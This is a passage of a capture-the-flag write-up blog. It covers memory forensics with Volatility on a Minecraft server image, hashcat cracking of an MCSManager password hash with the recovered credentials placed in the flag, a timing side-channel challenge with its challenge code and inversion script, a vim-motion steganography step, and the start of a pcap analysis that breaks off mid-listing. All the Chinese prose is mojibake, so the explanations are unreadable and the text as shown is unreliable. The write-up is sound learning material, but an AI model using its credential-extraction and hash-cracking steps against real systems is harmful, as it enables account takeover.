æ­¤å¯ä»¥æ¨æµ‹è¿™å°±æ˜¯ç›¸å…³çš„ç¨‹åºã€‚</p><p>Q3 è›¤å®¢zymè¿›å…¥ä¸Minecraftç›¸å…³çš„ç¨‹åºä½¿ç”¨çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯ä»€ä¹ˆ?</p><p>åœ¨ä¹‹å‰å¯¼å‡ºçš„æ‰€æœ‰æ–‡ä»¶åˆ—è¡¨ä¸­æœç´¢mcsmanagerï¼Œå¯ä»¥çŸ¥é“å®ƒçš„è·¯å¾„æ˜¯ï¼š<code>/opt/mcsmanager</code></p><p>ç”¨æˆ·åå’Œå¯†ç çš„æ ¸å¿ƒæ˜¯æ‰¾åˆ°å¹¶åˆ†æå…¶é…ç½®æ–‡ä»¶æˆ–æ•°æ®åº“ï¼Œå› ä¸ºå¯†ç é€šå¸¸ä»¥å“ˆå¸Œæˆ–åŠ å¯†å½¢å¼å­˜å‚¨å…¶ä¸­ã€‚</p><p>åœ¨å†…å­˜ä¸­æœmcsanagerç›®å½•ä¸‹æ‰€æœ‰å¯èƒ½åŒ…å«å‡­è¯çš„æ–‡ä»¶ï¼š</p><p><code>python2 vol.py -f ~/Desktop/mem.mem --profile=LinuxDeepin_4_9_0-deepin13-amd64_profilex64 linux_enumerate_files | grep -i &quot;/opt/mcsmanager&quot; | grep -E &quot;(config|\.json|\.db|\.sqlite|data)&quot;</code></p><p>åœ¨å…¶ä¸­æ‰¾åˆ°äº†userç›®å½•ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512081926739.png" alt="image-20251208192607697"></p><p>å¯¼å‡º/userä¸‹çš„jsonæ–‡ä»¶ï¼š</p><p><code>python2 vol.py -f ~/Desktop/mem.mem --profile=LinuxDeepin_4_9_0-deepin13-amd64_profilex64 linux_find_file -i 0xffff9b883f2be658 -O ~/Desktop/b403738834b24115b7f503dbb4d18d8b.json</code></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512081932672.png" alt="image-20251208193216628"></p><p>å¯ä»¥çœ‹åˆ°ç”¨æˆ·åå’Œå¯†ç å“ˆå¸Œï¼Œhashcatå­—å…¸çˆ†ç ´å¾—åˆ°å¯†ç ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512081954978.png" alt="image-20251208195437925"></p><p>Q4 è¯·ä»è›¤å®¢zymçš„å…¥ä¾µç—•è¿¹æ‰¾å‡ºä»–é€šè¿‡ä¸Šä¼ äº†ä»€ä¹ˆå¾—åˆ°äº†shell?</p><p>2025-05-12çš„æ—¥å¿—ä¸­å¯ä»¥çŸ¥é“å‘ç°W4ngXunF1shæ‰§è¡Œäº†shellå‘½ä»¤ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512091128281.png" alt="image-20251209112809752">åŒæ—¶æ‰§è¡ŒåæœåŠ¡å™¨å‡ºç°äº†å¼‚å¸¸</p><p>æ‰¾åˆ°ä¹‹åæ—¶é—´çš„æ—¥å¿—ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512091138300.png" alt="image-20251209113839196"></p><p>åˆ†æå‘ç°Purpur æœåŠ¡å™¨çš„ Watchdog çº¿ç¨‹æ£€æµ‹åˆ°ä¸»çº¿ç¨‹å¡æ­»ï¼ŒæœåŠ¡å™¨ä¸»çº¿ç¨‹åœ¨è¯»å–æ–‡ä»¶æ—¶è¢«é˜»å¡äº†ã€‚ä»å †æ ˆè·Ÿè¸ªå¯ä»¥çœ‹å‡ºï¼š</p><p><code>cloud.xzai.message.MessageEvent.onPlayerChat(MessageEvent.java:89)</code></p><p>åœ¨ <code>MessageEvent.java</code> çš„ç¬¬89è¡Œï¼Œä»£ç æ­£åœ¨æ‰§è¡Œæ–‡ä»¶è¯»å–æ“ä½œã€‚</p><p>åˆ†æå¾—çŸ¥<code>Dream.jar</code> æ’ä»¶ä¸­çš„ <code>MessageEvent.onPlayerChat</code> æ–¹æ³•åœ¨å¤„ç†ç©å®¶èŠå¤©æ—¶ï¼Œæ­£åœ¨åŒæ­¥è¯»å–æ–‡ä»¶</p><p>å¯¼å‡ºDream.jarè¿›è¡Œåˆ†æï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512091141191.png" alt="image-20251209114111097"></p><p>ç¡®è®¤äº†è¿™æ˜¯ä¸€ä¸ªåé—¨æ’ä»¶</p><p>VNCTF{W4ngXunF1sh_mcsmanager_nOo0b,Aa123456789_Dream.jar}</p><h2 id="å¼ºç½‘æ‹Ÿæ€çº¿ä¸‹-2025"><a href="#å¼ºç½‘æ‹Ÿæ€çº¿ä¸‹-2025" class="headerlink" title="å¼ºç½‘æ‹Ÿæ€çº¿ä¸‹ 2025"></a>å¼ºç½‘æ‹Ÿæ€çº¿ä¸‹ 2025</h2><div class="note green icon-padding flat"><i class="note-icon fas fa-fan"></i><p>å²é¢˜å…±èµï¼ˆbushi</p></div><blockquote><p>å¤ç°å‚è€ƒï¼š <a href="https://goodlunatic.github.io/posts/353513a/">https://goodlunatic.github.io/posts/353513a/</a></p></blockquote><h3 id="æ³„éœ²çš„æ—¶é—´ä¸ç”µç "><a href="#æ³„éœ²çš„æ—¶é—´ä¸ç”µç " class="headerlink" title="æ³„éœ²çš„æ—¶é—´ä¸ç”µç "></a>æ³„éœ²çš„æ—¶é—´ä¸ç”µç </h3><p>é¢˜ç›®æœ‰ä¸‰ä¸ªé™„ä»¶ï¼š</p><p>chal.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SecureTypewriter</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.lfsr = <span class="number">0x92</span> </span><br><span class="line">        <span class="variable language_">self</span>.time_unit = <span class="number">0.005</span>  </span><br><span class="line">        <span class="variable language_">self</span>.jitter = <span class="number">0.001</span></span><br><span class="line">        <span class="variable language_">self</span>.base_overhead = <span class="number">10</span></span><br><span class="line">        <span class="variable language_">self</span>.branch_penalty = <span class="number">30</span> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">step_lfsr</span>(<span class="params">self</span>):</span><br><span class="line">        bit = ((<span class="variable language_">self</span>.lfsr &gt;&gt; <span class="number">0</span>) ^ (<span class="variable language_">self</span>.lfsr &gt;&gt; <span class="number">2</span>) ^ (<span class="variable language_">self</span>.lfsr &gt;&gt; <span class="number">3</span>) ^ (<span class="variable language_">self</span>.lfsr &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">1</span></span><br><span class="line">        <span class="variable language_">self</span>.lfsr = (<span class="variable language_">self</span>.lfsr &gt;&gt; <span class="number">1</span>) | (bit &lt;&lt; <span class="number">7</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.lfsr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">scramble</span>(<span class="params">self, val</span>):</span><br><span class="line">        <span class="keyword">return</span> ((val * <span class="number">0x1F</span>) + <span class="number">0x55</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_char</span>(<span class="params">self, char</span>):</span><br><span class="line">        c = <span class="built_in">ord</span>(char)</span><br><span class="line">        </span><br><span class="line">        k = <span class="variable language_">self</span>.step_lfsr()</span><br><span class="line">        </span><br><span class="line">        val = c ^ k</span><br><span class="line">        </span><br><span class="line">        base_ops = <span class="variable language_">self</span>.scramble(val)</span><br><span class="line">        </span><br><span class="line">        current_ops = <span class="variable language_">self</span>.base_overhead + base_ops</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> base_ops % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            current_ops += <span class="variable language_">self</span>.branch_penalty</span><br><span class="line">            </span><br><span class="line">        real_duration = current_ops * <span class="variable language_">self</span>.time_unit</span><br><span class="line">        </span><br><span class="line">        noise = random.uniform(-<span class="variable language_">self</span>.jitter, <span class="variable language_">self</span>.jitter)</span><br><span class="line">        total_time = <span class="built_in">max</span>(<span class="number">0</span>, real_duration + noise)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> total_time</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_text</span>(<span class="params">self, text</span>):</span><br><span class="line">        timings = []</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">            elapsed = <span class="variable language_">self</span>.process_char(char)</span><br><span class="line">            timings.append(elapsed)</span><br><span class="line">        <span class="keyword">return</span> timings</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read().strip()</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: flag.txt not found.&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">    machine = SecureTypewriter()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Processing <span class="subst">&#123;<span class="built_in">len</span>(content)&#125;</span> characters with SecureTypewriter v2.0...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    logs = machine.process_text(content)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;timing.log&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> logs:</span><br><span class="line">            f.write(<span class="string">f&quot;<span class="subst">&#123;t:<span class="number">.6</span>f&#125;</span>\n&quot;</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Processing complete. Timing data saved to timing.log&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>timing.log:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">1.110270</span><br><span class="line">0.924169</span><br><span class="line">1.139244</span><br><span class="line">0.670085</span><br><span class="line">0.915054</span><br><span class="line">1.154452</span><br><span class="line">0.224613</span><br><span class="line">0.329060</span><br><span class="line">0.774615</span><br><span class="line">0.279617</span><br><span class="line">0.954166</span><br><span class="line">0.430143</span><br><span class="line">0.414914</span><br><span class="line">1.224826</span><br><span class="line">1.310686</span><br><span class="line">1.265828</span><br><span class="line">0.110950</span><br><span class="line">1.225669</span><br><span class="line">1.404647</span><br><span class="line">0.575287</span><br><span class="line">1.455927</span><br><span class="line">0.975492</span><br><span class="line">0.305642</span><br><span class="line">0.835893</span><br><span class="line">1.245893</span><br><span class="line">0.569651</span><br><span class="line">1.060266</span><br><span class="line">0.149129</span><br><span class="line">0.844243</span><br><span class="line">1.294104</span><br><span class="line">0.079101</span><br><span class="line">0.914897</span><br><span class="line">1.025389</span><br><span class="line">0.270495</span><br><span class="line">0.225577</span><br><span class="line">0.654189</span><br><span class="line">1.385665</span><br><span class="line">0.755860</span><br><span class="line">0.450597</span><br><span class="line">0.950750</span><br><span class="line">0.839268</span><br><span class="line">1.015624</span><br><span class="line">0.895000</span><br><span class="line">0.794687</span><br><span class="line">1.064966</span><br><span class="line">1.200042</span><br><span class="line">0.559413</span><br><span class="line">0.980588</span><br><span class="line">0.525959</span><br><span class="line">0.514992</span><br><span class="line">0.629261</span><br><span class="line">0.489585</span><br><span class="line">1.089786</span><br><span class="line">0.880690</span><br><span class="line">1.374392</span><br><span class="line">0.789075</span><br><span class="line">0.814771</span><br><span class="line">1.455273</span><br><span class="line">1.050996</span><br><span class="line">0.234891</span><br><span class="line">1.074220</span><br><span class="line">0.099300</span><br><span class="line">1.319762</span><br><span class="line">0.935773</span><br><span class="line">0.454985</span><br><span class="line">0.425895</span><br><span class="line">0.704892</span><br><span class="line">1.095786</span><br><span class="line">1.165433</span><br><span class="line">1.295589</span><br><span class="line">0.749113</span><br><span class="line">0.885320</span><br><span class="line">1.244904</span><br><span class="line">0.659642</span><br><span class="line">0.635889</span><br><span class="line">0.435427</span><br><span class="line">0.520476</span><br><span class="line">0.870549</span><br><span class="line">0.890145</span><br><span class="line">1.125522</span><br><span class="line">1.064915</span><br><span class="line">0.399210</span><br><span class="line">0.865873</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»¥åŠä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºchalï¼Œé€šè¿‡åˆ†æï¼Œchal.pyå’Œchalé€»è¾‘ç›¸åŒï¼š</p><p>è¿™æ˜¯ä¸€ä¸ªæ¨¡æ‹ŸåŸºäºæ—¶é—´çš„ä¾§ä¿¡é“æ”»å‡»é˜²æŠ¤çš„ç³»ç»Ÿï¼Œ</p><p>è„šæœ¬è¿è¡Œåï¼š</p><ol><li>ä» <code>flag.txt</code> è¯»å–ç§˜å¯†å†…å®¹</li><li>ç”¨ä¸Šé¢çš„æ–¹æ³•é€ä¸ªå­—ç¬¦å¤„ç†</li><li>è®°å½•æ¯ä¸ªå­—ç¬¦çš„å¤„ç†æ—¶é—´</li><li>æŠŠæ—¶é—´æ•°æ®ä¿å­˜åˆ° <code>timing.log</code></li></ol><p>æ ¹æ®è„šæœ¬é€»è¾‘å¾ˆå®¹æ˜“å†™å‡ºé€†å‘è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">step_lfsr</span>(<span class="params">lfsr</span>):</span><br><span class="line">    bit = ((lfsr &gt;&gt; <span class="number">0</span>) ^ (lfsr &gt;&gt; <span class="number">2</span>) ^ (lfsr &gt;&gt; <span class="number">3</span>) ^ (lfsr &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">1</span></span><br><span class="line">    lfsr = (lfsr &gt;&gt; <span class="number">1</span>) | (bit &lt;&lt; <span class="number">7</span>)</span><br><span class="line">    <span class="keyword">return</span> lfsr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unscramble</span>(<span class="params">bops</span>):</span><br><span class="line">    <span class="keyword">return</span> ((bops - <span class="number">0x55</span>) * <span class="number">223</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–æ—¶é—´æ•°æ®</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;timing.log&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    timings = [<span class="built_in">float</span>(line.strip()) <span class="keyword">for</span> line <span class="keyword">in</span> f]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">lfsr = <span class="number">0x92</span>  <span class="comment"># åˆå§‹çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, t <span class="keyword">in</span> <span class="built_in">enumerate</span>(timings):</span><br><span class="line">    <span class="comment"># æ›´æ–° LFSRï¼Œä¸åŠ å¯†æ—¶å®Œå…¨ä¸€è‡´</span></span><br><span class="line">    lfsr = step_lfsr(lfsr)</span><br><span class="line">    k = lfsr</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è®¡ç®— current_opsï¼ˆè€ƒè™‘å™ªå£°ï¼‰</span></span><br><span class="line">    current_ops = <span class="built_in">round</span>(t / <span class="number">0.005</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å°è¯•ä¸¤ç§åˆ†æ”¯</span></span><br><span class="line">    candidates = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åˆ†æ”¯1ï¼šbase_ops æ˜¯å¶æ•°ï¼ˆæ—  penaltyï¼‰</span></span><br><span class="line">    base_ops_even = current_ops - <span class="number">10</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= base_ops_even &lt;= <span class="number">255</span> <span class="keyword">and</span> base_ops_even % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        val = unscramble(base_ops_even)</span><br><span class="line">        c = val ^ k</span><br><span class="line">        candidates.append(c)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åˆ†æ”¯2ï¼šbase_ops æ˜¯å¥‡æ•°ï¼ˆæœ‰ penaltyï¼‰</span></span><br><span class="line">    base_ops_odd = current_ops - <span class="number">40</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= base_ops_odd &lt;= <span class="number">255</span> <span class="keyword">and</span> base_ops_odd % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        val = unscramble(base_ops_odd)</span><br><span class="line">        c = val ^ k</span><br><span class="line">        candidates.append(c)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># é€‰æ‹©æœ€ä½³å€™é€‰</span></span><br><span class="line">    chosen_char = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> candidates:</span><br><span class="line">        <span class="keyword">if</span> <span class="number">32</span> &lt;= c &lt;= <span class="number">126</span>:  <span class="comment"># å¯æ‰“å° ASCII</span></span><br><span class="line">            chosen_char = <span class="built_in">chr</span>(c)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> chosen_char == <span class="string">&#x27;?&#x27;</span> <span class="keyword">and</span> candidates:</span><br><span class="line">        chosen_char = <span class="built_in">chr</span>(candidates[<span class="number">0</span>])</span><br><span class="line">    </span><br><span class="line">    flag += chosen_char</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered text:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†ä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">h i j k l m n</span><br><span class="line">8 9 0 / - _ =</span><br><span class="line">a b c d e f g</span><br><span class="line">v w x y z &#123; &#125;</span><br><span class="line">o p q r s t u</span><br><span class="line">1 2 3 4 5 6 7</span><br></pre></td></tr></table></figure><p>åšåˆ°è¿™é‡Œçš„æ—¶å€™å·²ç»æ‰‹è¶³æ— æªäº†â€¦â€¦åæ¥ç»™å‡ºäº†hintï¼šModR/Mï¼Œä¸è¿‡ä¾ç„¶æ²¡æœ‰æ‰¾å¯¹æ–¹å‘ã€‚ã€‚ã€‚</p><p>åŸæ¥è¿™é‡Œæ˜¯éšå†™ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512021345662.png" alt="image-20251202134502613"></p><p>åˆ©ç”¨å·¥å…·æå–ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512021351831.png" alt="image-20251202135113788"></p><p>è§£åå…­è¿›åˆ¶å¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2j10l kkhh :3 $ jhh 4h 2k2h $3j 4h3k j20h jj6l kkll llk ^j kk$hh 0jj /z :6 5k$ jj j</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯vimç¼–è¾‘å™¨çš„æ“ä½œç¬¦ï¼Œä½¿ç”¨vimæ‰“å¼€å¾—åˆ°çš„è¡¨ï¼Œè¾“å…¥ä»¥ä¸Šå†…å®¹,æŸ¥çœ‹å…‰æ ‡çš„ä½ç½®ï¼Œå³å¯å¾—åˆ°flagï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512021522642.png" alt="image-20251202152211500"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;y0u-are_amaz1ng&#125;</span><br></pre></td></tr></table></figure><h3 id="æ ‡å‡†çš„ç»å¯†å‹ç¼©"><a href="#æ ‡å‡†çš„ç»å¯†å‹ç¼©" class="headerlink" title="æ ‡å‡†çš„ç»å¯†å‹ç¼©"></a>æ ‡å‡†çš„ç»å¯†å‹ç¼©</h3><p>è¿½è¸ªæµï¼Œå‘ç°æœ‰å¾ˆå¤špngæ ¼å¼ä¼ è¾“çš„å†…å®¹ï¼ˆ89504e47ï¼‰:</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512021527314.png" alt="image-20251202152735164"></p><p>è€Œåˆ°32æµä¹‹åï¼Œå‘ç°è¯·æ±‚åŒ…ä¸å†æ˜¯è¿™ç§æ ¼å¼ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512021547855.png" alt="image-20251202154733743"></p><p>è¯´æ˜åŠ å¯†æ–¹å¼å‘ç”Ÿå˜åŒ–ï¼</p><p>å…ˆå°è¯•æå–å‡ºæ‰€æœ‰çš„png:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span 